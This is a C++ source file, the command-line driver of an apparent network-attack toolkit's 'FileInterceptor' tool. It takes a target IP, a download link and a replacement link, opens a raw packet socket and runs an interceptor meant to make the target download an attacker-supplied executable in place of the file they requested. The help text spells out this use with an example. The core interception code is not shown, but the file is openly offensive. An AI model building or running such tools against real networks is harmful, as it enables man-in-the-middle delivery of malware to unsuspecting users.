#include "FileInterceptor.h"

#include <iostream>

#include <arpa/inet.h> 
#include <netinet/ip.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>

#define DOWNLOAD_LINK_STR_SIZE  512

void PrintHelp(char** argv)
{
    std::cout
        << "To use the program, provide the arguments in the following format:\n"
        << argv[0] << " <interface name> <ip version> <target ip> <download link> <new download link>\n\n"
        << "<interface name>: the interface you wish to use.\n"
        << "<ip version>: ip version of the target, must be 4 or 6\n"
        << "<target ip>: target whose file you wish to intercept\n"
        << "<download link>: file you wish to replace\n"
        << "<new download link>: the path to the file you want the target to download\n\n"
        << "Example: " << argv[0] << " eth0 "<< "4 " << "10.0.2.4 " << " download.example.co/testfile.exe" << "10.0.2.15/test_program.exe" << std::endl;
}

// TODO: improve args processing
int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion, char* targetIP, char* downloadLink, char* newDownloadLink)
{
    if((argc == 2) && (PacketCraft::CompareStr(argv[1], "?") == TRUE))
    {
        PrintHelp(argv);
        exit(EXIT_SUCCESS);
    }

    if(argc != 6)
        return APPLICATION_ERROR;

    if(PacketCraft::GetStrLen(argv[1]) > IFNAMSIZ)
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(interfaceName, IFNAMSIZ, argv[1]);

    if(PacketCraft::CompareStr(argv[2], "4") == TRUE)
        ipVersion = AF_INET;
    else if(PacketCraft::CompareStr(argv[2], "6") == TRUE)
        ipVersion = AF_INET6;
    else
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(targetIP, INET6_ADDRSTRLEN, argv[3]);
    PacketCraft::CopyStr(downloadLink, DOWNLOAD_LINK_STR_SIZE, argv[4]);
    PacketCraft::CopyStr(newDownloadLink, DOWNLOAD_LINK_STR_SIZE, argv[5]);

    return NO_ERROR;
}

int main(int argc, char** argv)
{
    char interfaceName[IFNAMSIZ]{};
    uint32_t ipVersion{};
    char targetIPStr[INET6_ADDRSTRLEN]{};
    char downloadLink[DOWNLOAD_LINK_STR_SIZE]{};
    char newDownloadLink[DOWNLOAD_LINK_STR_SIZE]{};

    if(ProcessArgs(argc, argv, interfaceName, ipVersion, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ProcessArgs() error!");
        PrintHelp(argv);
        return APPLICATION_ERROR;
    } 

    int socketFd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    CHaks::FileInterceptor fileInterceptor;

    if(fileInterceptor.Init(ipVersion) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Init() error");
        close(socketFd);
        return APPLICATION_ERROR;
    }

    if(fileInterceptor.Run(socketFd, interfaceName, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
        close(socketFd);
        return APPLICATION_ERROR;
    }


    close(socketFd);
    return NO_ERROR;    
}